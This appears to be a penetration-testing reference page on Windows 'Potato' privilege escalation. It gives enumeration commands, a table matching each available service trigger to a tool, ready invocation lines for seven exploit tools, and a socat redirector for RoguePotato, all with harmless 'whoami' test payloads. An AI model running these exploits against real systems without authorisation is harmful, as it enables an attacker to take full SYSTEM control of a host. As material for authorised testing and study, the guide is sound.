# Potato privilege escalation

[← Windows quick reference](../04-windows-privesc.md)

"Potato" names several different techniques. Start with the current token and the service or RPC endpoint available on the host. An OS version alone does not pick a working binary.

## Check the host

Use this after landing in a service context such as IIS or MSSQL. `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` must be available for the token-impersonation paths below.

```powershell
whoami /all
whoami /priv
Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture
[System.Environment]::Version
```

Check a trigger before choosing its tool:

```powershell
sc.exe query Spooler
sc.exe query EFS
sc.exe query RasMan
sc.exe query InventorySvc
sc.exe query PcaSvc
```

| What is available | Candidate |
| --- | --- |
| RPCSS/DCOM on a newer host | SigmaPotato or GodPotato |
| Print Spooler | PrintSpoofer |
| EFSRPC | SharpEfsPotato or PetitPotato |
| Older Windows with a matching elevated CLSID | JuicyPotato |
| External TCP/135 redirector and a matching COM route | RoguePotato |

Test one candidate at a time. A tool's name, supported OS range, or success message does not prove that it obtained SYSTEM. A file is a better first test than a new console, which may be invisible from a service shell.

## Selected commands

Broad DCOM/RPCSS choices:

```powershell
.\SigmaPotato.exe 'cmd /c whoami > C:\Windows\Temp\sigma.txt'
.\GodPotato-NET4.exe -cmd 'cmd /c whoami > C:\Windows\Temp\god.txt'
```

Use either command only with a binary whose syntax you have checked. Read the output file after execution and confirm the identity.

With Print Spooler running:

```powershell
.\PrintSpoofer64.exe -c 'cmd /c whoami > C:\Windows\Temp\print.txt'
```

If EFSRPC is the viable trigger, select one implementation:

```powershell
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\sharp-efs.txt'
.\PetitPotato.exe 3 'cmd.exe /c whoami > C:\Windows\Temp\petit.txt'
```

Classic JuicyPotato belongs on a matching older host and needs an OS-appropriate CLSID:

```powershell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\juicy.txt' -t '*' -c '{<OS-MATCHING-CLSID>}'
```

RoguePotato also needs a Kali-side TCP/135 redirector. Confirm that the target can reach it.

```bash
sudo socat TCP-LISTEN:135,reuseaddr,fork TCP:<TARGET-IP>:9999
```

```powershell
.\RoguePotato.exe -r <KALI-IP> -e 'cmd.exe /c whoami > C:\Windows\Temp\rogue.txt' -l 9999
```

## When a choice fails

- A missing token privilege rules out these impersonation paths.
- Spooler being disabled rules out PrintSpoofer, but says nothing about EFSRPC or DCOM.
- A binary can fail because its service, endpoint, CLSID, .NET runtime, architecture, or network path is wrong for this host.
- Read the output file. "Exploit completed" is not an identity check.
- Remove staged binaries and test files after you finish.

## References

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [RoguePotato](https://github.com/antonioCoco/RoguePotato)
